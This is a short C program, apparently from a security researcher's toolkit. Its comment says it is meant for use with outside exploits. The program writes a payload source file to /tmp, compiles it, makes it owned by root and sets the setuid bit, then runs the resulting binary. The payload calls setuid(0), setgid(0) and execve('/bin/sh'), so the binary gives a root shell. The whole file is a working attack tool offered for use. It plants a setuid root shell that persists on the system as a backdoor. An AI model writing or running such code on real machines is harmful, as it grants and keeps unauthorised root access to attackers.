/*
 *
 * simple universal setuid(0) app generator
 *
 * meant for use with outside exploits
 * since i find myself having to create setuid(0) / execve('/bin/sh')
 * constantly during vuln research, this little app creates the payload
 * automagically inside the /tmp directory, compiles, sets suid privs and
 * then executes. oh so simple.
 */


#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

int create_payload(char *file)
{
    printf("[+] writing payload to file ...\n");
    char *payload = "int main(void){setuid(0);setgid(0);execve(\"/bin/sh\",0,0);}";
    int fd = open(file, O_CREAT|O_RDWR, S_IRWXU|S_IRWXG|S_IRWXO);
    write(fd, payload, strlen(payload));
    close(fd);
    printf("[+] compiling ...\n");
    system("/usr/bin/gcc /tmp/burn.c -o /tmp/burn");
    printf("[+] setting privileges ...\n");
    system("chown root:root /tmp/burn && chmod u+s /tmp/burn\n");
    return 0;
}

int main(int argc, char **argv)
{
    char *filepath = "/tmp/burn.c";
    create_payload(filepath);
    printf("[+] executing shell ...\n");
    execve("/tmp/burn", NULL, NULL);
    return 0;
}
